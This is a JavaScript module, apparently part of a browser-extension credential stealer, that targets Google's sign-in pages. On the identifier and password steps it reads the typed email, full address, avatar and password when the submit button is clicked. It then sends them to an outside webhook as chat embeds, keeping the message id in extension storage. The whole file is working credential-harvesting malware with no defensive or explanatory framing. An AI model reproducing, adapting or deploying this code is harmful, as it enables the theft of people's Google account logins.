const Util = require('../../utils');
const { formatFields, code, getFooter } = require('../../utils/Webhook');
const { wait } = require('../../utils/Document');
const variable = `${window.location.hostname}_${Date.now()}_messageId`;

module.exports = {
  webPattern: /https:\/\/accounts\.google\.com/g,
  urlsMatches: [
    {
      path: '/v3/signin/identifier',
      run() {
        const emailInput = document.querySelector(this.getSelector('input'))?.value;
        const submitButton = document.querySelector(this.getSelector('submit'));

        submitButton.addEventListener('click', async () => {
          const { id } = await Util.Webhook.sendEmbed({
            author: { name: emailInput },
            title: 'New account is being added',
            fields: formatFields([
              ['Email', code(emailInput)],
            ]),
            footer: getFooter()
          });
          await chrome.storage.local.set({ [variable]: id });
        });
      }
    },
    {
      path: '/v3/signin/challenge/pwd',
      async run() {
        await wait(1000);
        const passwordInput = document.querySelector(this.getSelector('input'))?.value;
        const fullEmail = document.querySelector(this.getSelector('emailStr'))?.textContent;
        const avatar = document.querySelector(this.getSelector('avatar'))?.getAttribute('src');
        const submitButton = document.querySelector(this.getSelector('submit'));

        submitButton.addEventListener('click', async () => {
          if (!passwordInput || passwordInput.length < 8) return;
          const id = (await chrome.storage.local.get(variable))[variable];
          if (!id) return;
          const { embeds: [embed] } = await Util.Webhook.getMessage(id);
          embed.author = { name: fullEmail, icon_url: avatar.startsWith('//') ? `https:${avatar}` : avatar };
          embed.fields[0].value = code(fullEmail);
          embed.fields.push(formatFields([['Password', code(passwordInput)]])[0]);
          await Util.Webhook.editEmbed(embed, id);
        });
      }
    }
  ],
  selectors: {
    input: '.whsOnd.zHQkBf',
    submit: 'button[jscontroller="soHxf"][data-idom-class^="nCP5yc AjY5Oe"]',
    emailStr: 'div[jsname="bQIQze"]',
    avatar: 'img.r78aae.TrZEUc'
  }
};
